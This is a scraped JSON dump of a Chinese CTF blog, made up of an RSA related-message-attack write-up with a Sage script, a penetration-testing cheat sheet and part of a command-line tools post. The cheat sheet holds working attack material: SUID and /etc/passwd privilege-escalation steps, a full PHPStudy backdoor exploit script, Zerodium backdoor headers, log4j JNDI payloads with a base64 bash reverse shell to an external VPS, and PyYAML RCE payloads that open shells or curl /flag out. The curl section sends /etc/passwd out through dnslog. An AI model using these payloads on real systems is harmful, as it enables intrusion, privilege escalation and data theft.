getPrime,inverse,bytes_to_long,long_to_bytesfrom sympy import isprimem = bytes_to_long(flag)i=0p=getPrime(1024)r=getPrime(1024)while True: i+=1 q = 5*p+i if isprime(q) : breakn=p*q*re = 65537c = pow(m,e,n)p3 = pow(p,3,n)q3 = pow(q,3,n)print cprint eprint nprint p3print q3#c=121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823#e=65537#n=20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091#p3=3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513#q3=7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 由脚本知 $p,q$ 为线性关系： $q=5p+k,k\\in\\mathbb{Z}$ 又已知 $p,q$ 用 $e=3$ 得到的密文 $p3,q3$，满足 Related Message Attack 条件，运行Sage脚本得到 $p,q$，再求得 $r$，按照常规RSA解法求出flag。 Related Message Attack Sage脚本： 1234567891011121314151617181920212223242526272829303132333435#Sagedef short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (5*x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4 return diffdef related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (5*x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]if __name__ == &#x27;__main__&#x27;: n = 20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091 e = 3 c1 = 3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513 c2 = 7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 diff = short_pad_attack(c1, c2, e, n) print(&quot;difference of two messages is %d&quot; % diff) p = related_message_attack(c1, c2, diff, e, n) print(&quot;p:&quot;, p) print(&quot;q:&quot;, 5*p + diff)","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"渗透","slug":"web-渗透","date":"2020-07-23T16:49:37.000Z","updated":"2025-04-24T12:41:19.996Z","comments":true,"path":"2020/07/24/web-渗透/","permalink":"https://lazzzaro.github.io/2020/07/24/web-%E6%B8%97%E9%80%8F/","excerpt":"","text":"​ 渗透（Hack The Box / HTB）信息泄露git如存在 .git 泄露： githacker --url http://x.x.x.x/ --output-folder test 查看历史commits：git commit 回退到上一个版本：git reset --hard HEAD^ ​ 扫描nmapnmap -sC -sV xx.xx.xx.xx -oA src/ -sC is for using default nmap scripts, -sV for enumerating services versions, -oA is for output ALL format and specify the directory src, NOTICE: you may be adding -Pn if you have an error wait for some time and here is the result. ​ 终端将简单的Shell转换成为完全交互式的TTY： python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; ​ 提权参考：GTFOBins SUID提权（4000权限） SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。 发现系统上运行的所有SUID可执行文件，不同系统适用于不同的命令： 123find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -print 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 环境变量123456789#/home/raj/script/shell具SUID权限cd /tmpecho “/bin/bash” &gt; pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/raj/script./shellwhoami 123456#/home/raj/script/shell具SUID权限，且shell中用system命令执行了service指令echo &#x27;#!/bin/bash&#x27;&gt;serviceecho &#x27;/bin/bash&#x27;&gt;&gt;serviceexport PATH=/home/raj/script:$PATHchmod +x service./shell find123# 普通用户，进入到/tmp目录下，然后新建一个文件touch abcdfind abcd -exec whoami \\; /etc/shadow1xxd &quot;/etc/shadow&quot; | xxd -r /etc/passwd12345cat /etc/passwd&gt;passwdecho &quot;test:abRcsZmlrrKFA:0:0:,,,:/root:/bin/bash&quot; &gt;&gt;passwdcp passwd /etc/passwdpython3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;su - test nlnl /flag date/usr/bin/date -f /flag （利用date命令的 -f 参数读取文件） curlcurl file:///flag cpcp /flag /dev/stdout gzipgzip -f /flag -t wcwc --files0-from /flag pythonpython -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39; python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39; 以其他用户运行命令sudo -l （查看此用户拥有的特殊权限，如 NOPASSWD，路径 /etc/sudoer.d） echo password | su -c userB cat xxx.txt 根目录非root权限ls -al / （检查根目录权限是否非root） 123456mv bin bin1/bin1/mkdir bin/bin1/chmod 777 bin/bin1/echo &quot;/bin1/cat /flag&quot; &gt; /bin/umount/bin1/chmod 777 /bin/umountexit pkexec提权漏洞/usr/lib/policykit-1/polkit-agent-helper-1 https://github.com/arthepsy/CVE-2021-4034 12chmod +x ./pkexec_poc./pkexec_poc ​ 非常规读文件12/lib/gcc/x86_64-linux-gnu/[id]/cc1 /etc/passwd -o /dev/null/lib/gcc/x86_64-linux-gnu/[id]/cc1plus /etc/passwd -o /dev/null ​ 内网穿透 探测内网主机 1for k in $( seq 1 255);do ping -c 1 10.203.113.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#x27;&#123;print $4&#125;&#x27;; done 常见端口扫描 EW代理：./ew_for_linux64 -s ssocksd -l 9999 扫描：proxychains3 nmap 扫描常见端口 操作 远程连接数据库：proxychains3 mysql -h 10.203.113.33 -u ctf -p 启动火狐浏览器：proxychains3 firefox 远程连接：proxychains3 rdesktop 10.203.113.34:3389 proxychainsProxyChains是Linux和其他Unix下的代理工具。 它可以使任何程序通过代理上网， 允许TCP和DNS通过代理隧道， 支持HTTP、 SOCKS4和SOCKS5类型的代理服务器， 并且可配置多个代理。 ProxyChains通过一个用户定义的代理列表强制连接指定的应用程序， 直接断开接收方和发送方的连接。 配置文件：/etc/proxychains.conf，在末尾添加代理。 frpfrp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。 项目地址 https://github.com/fatedier/frp/blob/master/README_zh.md 目录文件： 1234567frpc 客户端可执行程序frpc_full.ini 客户端所有配置项（可以再此文件查看frp的所有的配置项）frpc.ini 客户端配置项frps 服务端可执行程序frps_full.ini 服务端所有配置项（可以再此文件查看frp的所有的配置项）frps.ini 服务端配置项LICENSE 许可证 服务端配置（ frps.ini 文件） 123[common]bind_port = 7000 # 客户端跟服务端绑定的端口号（端口可自定义，需客户端和服务端统一）vhost_http_port = 6001 # 访问6001端口，映射到内网web服务 启动： ./frps -c frps.ini 客户端配置（ frpc.ini 文件） 1234567891011121314151617181920212223[common]server_addr = x.x.x.x # 服务器公网IPserver_port = 7000 # 绑定的端口，自定义，与服务端一致即可[ssh]type = tcplocal_ip = 127.0.0.1 # 绑定的IP，本机填写127.0.0.1即可local_port = 22remote_port = 6008 # ssh默认是22，转发为6008端口# 访问：ssh root@x.x.x.x -p 6008[web]type = httplocal_port = 8080 # 访问本地8080web服务custom_domains = x.x.x.x # 已经备案的域名或服务器公网IP# 访问：http://x.x.x.x:6001 =&gt; http://127.0.0.1:8080[mysql]type = tcplocal_ip = 127.0.0.1 # 绑定的IP，本机填写127.0.0.1即可local_port = 3306remote_port = 4406 # mysql默认是3306，转发为4406端口# 访问：mysql -hx.x.x.x -P4406 -uroot -proot 启动： ./frpc -c frpc.ini ​ 其他PHPStudy 后门漏洞123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104import requestsimport base64from random import choiceUSER_AGENTS = [ &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;, &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;, &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;, &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;, &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;, &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;, &quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;, &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;, &quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;]TIME_OUT=10print(r&quot;&quot;&quot; _____ _ _ _____ _____ _ _ ____ _ _ | __ \\ | | | || __ \\ / ____|| | | | | _ \\ | | | | | |__) || |__| || |__) || (___ | |_ _ _ __| | _ _ | |_) | __ _ ___ | | __ __| | ___ ___ _ __ | ___/ | __ || ___/ \\___ \\ | __|| | | | / _` || | | | | _ &lt; / _` | / __|| |/ // _` | / _ \\ / _ \\ | &#x27;__| | | | | | || | ____) || |_ | |_| || (_| || |_| | | |_) || (_| || (__ | &lt;| (_| || (_) || (_) || | |_| |_| |_||_| |_____/ \\__| \\__,_| \\__,_| \\__, | |____/ \\__,_| \\___||_|\\_\\\\__,_| \\___/ \\___/ |_| __/ | |___/ Usage &amp; e.g. : Target Url: localhost/flag.php Input Your Command: phpinfo(); Notice: Command Must Be PHP Function, If You Want To Execute OS Command, Use: system(&#x27;YOUR COMMAND&#x27;); By:Sp4ce Have Fun&quot;&quot;&quot;)def checkTarget(url): poc = &#123; &quot;Accept-Charset&quot;: &quot;cGhwaW5mbygpOw==&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot; &#125; try: pocRequest = requests.get(url, headers=poc,timeout=TIME_OUT) if &quot;phpinfo&quot; in str(pocRequest.content): print(&#x27;[+] Target is vulnerable.&#x27;) return True else: print(&#x27;[-] Target is NOT vulnerable.&#x27;) return False except : print(&#x27;[-] Looks Like Something Wrong.&#x27;)def exploit(url,command): headers = &#123;&#125; headers[&#x27;User-Agent&#x27;] = choice(USER_AGENTS) headers[&#x27;Accept-Encoding&#x27;] = &#x27;gzip,deflate&#x27; headers[&#x27;Accept-Charset&#x27;] = command try: request = requests.get(url, headers=headers) if request.status_code == 200: print(&#x27;[+] Command Execute Successful.&#x27;) print(request.text) else: print(&#x27;[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.&#x27;) except: print(&#x27;[-] Looks Like Something Wrong.\\n&#x27;)if __name__ == &quot;__main__&quot;: while True: url = input(&quot;Target Url:\\n&quot;) if &#x27;http&#x27; not in url: url = &quot;http://&quot; + url print(&#x27;[i] Checking Target...&#x27;) if checkTarget(url): cmd = input(&quot;Input Your Command:\\n&quot;) command = base64.b64encode(cmd.encode(&#x27;utf-8&#x27;)) exploit(url,command) zerodium 后门列目录：User-Agentt: zerodiumsystem(&#39;ls /&#39;); 读文件：User-Agentt: zerodiumsystem(&#39;cat /flag&#39;); log4j2 漏洞（CVE-2021-44228）步骤： 在vps上通过 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar 启动监听 123java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny54eHgueHh4LjIyMC8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;47.xxx.xxx.220&quot;# YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny54eHgueHh4LjIyMC8yMzMzIDA+JjE= 为 bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.220/2333 0&gt;&amp;1, 用于反弹shell 将payload填入找到的漏洞处 1$&#123;jndi:ldap:$&#123;sys:file.separator&#125;$&#123;sys:file.separator&#125;47.xxx.xxx.220:1389$&#123;sys:file.separator&#125;ge5udq&#125; 参考：Apache Log4j2漏洞复现-反弹shell 绕过： 12345678$&#123;jndi:ladp://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;::-j&#125;ndi:rmi://xxxxxx.dnslog.cn/exp&#125;$&#123;jndi:rmi://xxxxxx.dnslog.cn&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://xxxxxx.dnslog.cn/exp&#125; PyYAML漏洞（CVE-2020-1747）版本：5.3 123456789# pyyaml==5.3 required. Vulnerability has been fixed in 5.3.1# More: ret2libc&#x27;s report in https://github.com/yaml/pyyaml/pull/386# Explanation: https://2130706433.net/blog/pyyaml/from yaml import *with open(&#x27;payload.yaml&#x27;,&#x27;rb&#x27;) as f: content = f.read()data = load(content, Loader=FullLoader) # Using vulnerable FullLoader RCE： 123456789!!python/object/new:str args: [] state: !!python/tuple - &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/IP/PORT &lt;&amp;1\\&quot;&#x27;)&quot; - !!python/object/new:staticmethod args: [] state: update: !!python/name:eval items: !!python/name:list 12345678910# payload.yaml# The `extend` function is overriden to run `yaml.unsafe_load` with # custom `listitems` argument, in this case a simple curl request- !!python/object/new:yaml.MappingNode listitems: !!str &#x27;!!python/object/apply:subprocess.Popen [[&quot;curl&quot;, &quot;http://127.0.0.1/rce&quot;]]&#x27; state: tag: !!str dummy value: !!str dummy extend: !!python/name:yaml.unsafe_load 123!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval ,[&quot;\\x5f\\x5fimport\\x5f\\x5f(&#x27;os&#x27;)\\x2esystem(&#x27;curl http://xxx.xxx.xxx.xxx:1234 -d@/flag&#x27;)&quot;]]] 123!!python/object/new:type args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;] listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;curl -d @/flag http://111.111.111.111:8082&#x27;)&quot; 参考： 浅谈PyYAML反序列化漏洞 PyYAML反序列化防御和ByPass uiuctf 2020 Development Server源码泄露（CNVD-2023-05738）PHP&lt;=7.4.21 Development Server源码泄露漏洞 PHP Development Server存在信息泄露漏洞，该漏洞源于php cli server begin send static在解析http请求时存在逻辑漏洞，攻击者可利用该漏洞将两个请求拼接至一个http请求中导致服务器将php文件作为静态文件返回。 1234567GET /A.php HTTP/1.1\\r\\nHost: 1.1.1.1:8888\\r\\n\\r\\n\\r\\nGET / HTTP/1.1\\r\\n\\r\\n 参考： PHP Development Server &lt;= 7.4.21 - Remote Source Disclosure","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://lazzzaro.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"提权","slug":"提权","permalink":"https://lazzzaro.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"内网","slug":"内网","permalink":"https://lazzzaro.github.io/tags/%E5%86%85%E7%BD%91/"}],"author":"Lazzaro"},{"title":"命令行工具","slug":"misc-命令行工具","date":"2020-07-05T12:12:03.000Z","updated":"2024-06-02T07:21:17.686Z","comments":true,"path":"2020/07/05/misc-命令行工具/","permalink":"https://lazzzaro.github.io/2020/07/05/misc-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/","excerpt":"","text":"​ 模拟工具RequestBin：http://requestbin.net/ （调试http/https交互） Ceye：http://ceye.io/ （检测带外流量的监控平台，如DNS查询和HTTP请求，收集信息SSRF / XXE / RFI / RCE） DNSlog：http://www.dnslog.cn/ （解析子域名存放的漏洞，发起DNS请求，日志反弹） bashupload：https://bashupload.com/ （从命令行上传文件，分析给其他的服务器） ​ Linux Bash内置变量 BASH用途：显示bash的完整路径名。通常是：/bin/bash或/usr/local/bin/bash。 BASH_VERSION用途：bash的版本。 FUNCNAME用途：在函数式执行期，此变量内容即为函数式的名称。 HISTCMD用途：当前指令执行完后，它在历史指令中的排列编号（指定给下一个指令用的历史命令编号）。 HISTCONTROL用途：控制指令是否存入历史脚本文件中。 HISTCONTROL有3个可能的设定值： ignorespace: 凡是指令开头有空格符的，不存入历史脚本文件中。 ignoredups: 连续重复的指令，只存一个。 ignoreboth: 结合前两者的功能。 HISTFILE用途：设定历史脚本文件的路径文件名。通常是在：家目录/.bash_history HISTFILESIZE用途：设定历史脚本文件存储指令的最大行数。 HISTIGNORE用途：不存入历史脚本文件的指令样式，以 : 隔开。 HOME用途：设定用户的家目录位置。通常，root的家目录在/root，一般用户的家目录在/home/账号。替换~的结果，就是HOME变量值。 HOSTNAME用途：显示主机名。 HOSTTYPE用途：显示主机形态。 IFS用途：定义字段分隔字符。默认值为：空格符、tab字符、换行字符(newline)。 MACHTYPE用途：描述主机形态的GNU格式：cpu-公司-系统。 MAIL用途：显示当前用户邮件目录。 MAILCHECK用途：每隔多久就检查一次邮件。通常默认是60秒。 PATH用途：命令的搜寻路径。 PPID用途：父进程的进程编号。 RANDOM用途：随机函数。 此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。 REPLY用途：select和read没有设定读取变量时，默认的变量名称为REPLY。 SHLVL用途：子shell的层级数。 $1~$n用途：位置参数。 传入程序或函数式的参数，第一个参数$1，第二参数$2，其他类推。 请注意，若位置参数n超过9以上，则要用$&#123;n&#125;来表示。 $0代表执行程序的名称。 $*用途：代表所有的位置参数，并且视为一个字符串。 如：test.sh ABC 123 xyz，则$*的内容为字符串ABC 123 xyz $@用途：代表所有的位置参数，但$@代表各位置参数组成的串行。 如：test.sh ABC 123 xyz，则$@的内容为ABC、123、xyz这3个字符串。 $#用途：位置参数的个数。 如：test.sh ABC 123 xyz，有3个参数，$#的值为3。 $?用途：上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误。 $$用途：目前bash shell的进程编号。 $&lt; 用途：获取目标依赖列表中的第一个依赖。 $_用途： a. script执行时，bash的绝对路径。 b. 上一个命令执行时，最后一个位置参数，如上一个命令是：test.sh ABC 123 xyz，则$_的值为xyz。 c. 检查邮件时，$_的值为邮件文件名。 ​ curlcurl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。 它的功能非常强大，命令行参数多达几十种。如果熟练的话，完全可以取代 Postman 这一类的图形界面工具。 不带有任何参数时，curl 就是发出 GET 请求。 $ curl https://www.example.com 执行命令： 12$ curl http://requestbin.net/r/1kiej1p1?p=`whoami`$ curl `cat /etc/passwd|base64`.xxxxxx.dnslog.cn #dnslog带外 参数说明： -A 指定客户端的用户代理标头，即User-Agent。curl 的默认用户代理字符串是curl/[version]。 1$ curl -A &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27; https://google.com -b 向服务器发送 Cookie。 1$ curl -b &#x27;foo=bar&#x27; https://google.com 上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。 -c -c参数将服务器设置的 Cookie 写入一个文件。 1$ curl -c cookies.txt https://www.google.com 上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt。 -d -d参数用于发送 POST 请求的数据体。 123$ curl -d&#x27;login=emma&amp;password=123&#x27;-X POST https://google.com/login # 或者 $ curl -d &#x27;login=emma&#x27; -d &#x27;password=123&#x27; -X POST https://google.com/login 